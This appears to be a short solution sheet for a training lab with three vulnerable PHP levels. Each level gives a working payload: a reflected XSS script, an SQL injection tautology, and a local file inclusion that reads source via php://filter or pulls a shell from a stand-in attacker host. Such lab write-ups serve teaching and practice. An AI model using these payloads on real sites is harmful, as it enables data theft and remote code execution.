## Level 1

**Vulnerability:** XSS (Cross Site Scripting)

**Exploit :** `/level1.php?username=<script>alert(1)</script>`

**Impact:** Execute arbitrary Javascript code on Web Browser.

## Level 2


**Vulnerability:** SQL injection

**Exploit :** `/level2.php?name='e' or '1'='1'`

**Impact:** Execute arbitrary SQL injection.

## Level 3


**Vulnerability:** Local File Inclusion

**Exploit (allow_url_include=Off):** `/level3.php?file=php://filter/convert.base64-encode/resource=level3`

**Exploit (allow_url_include=On):** `/level3.php?file=http://<attacker_IP>/shell`

**Impact:** Display the content of any PHP file on hard disk drive with the privileges of HTTP server (if allow_url_include=Off in PHP configuration). Execute arbitrary PHP code (if allow_url_include=On in PHP configuration).
